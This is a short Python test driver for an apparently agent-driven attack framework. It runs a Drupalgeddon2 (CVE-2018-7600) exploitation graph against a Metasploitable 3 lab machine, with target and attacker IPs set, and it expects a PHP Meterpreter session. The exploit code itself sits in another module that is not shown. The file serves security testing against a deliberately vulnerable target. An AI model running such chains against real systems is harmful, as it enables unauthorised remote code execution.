"""
Live test driver for examples/drupal_drupalgeddon2_graph.py.

Unauthenticated Drupal exploitation chain against Metasploitable 3's
Drupal install, served by Apache under /drupal on port 80
(CVE-2018-7600 Drupalgeddon2). Expected to land a PHP Meterpreter session.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core_agents.orchestrator import run_graph
from examples.drupal_drupalgeddon2_graph import build_drupal_drupalgeddon2_graph

TARGET_IP = "192.168.34.7"
ATTACKER_IP = "192.168.34.6"

if __name__ == "__main__":
    graph = build_drupal_drupalgeddon2_graph(target_ip=TARGET_IP, attacker_ip=ATTACKER_IP)
    print(f"Loaded graph: {graph.name}  ({len(graph.nodes)} nodes, {len(graph.edges)} edges)")
    print(f"Running with explore=True, use_judge=True against {TARGET_IP}...")
    run_graph(graph, explore=True, use_judge=True)
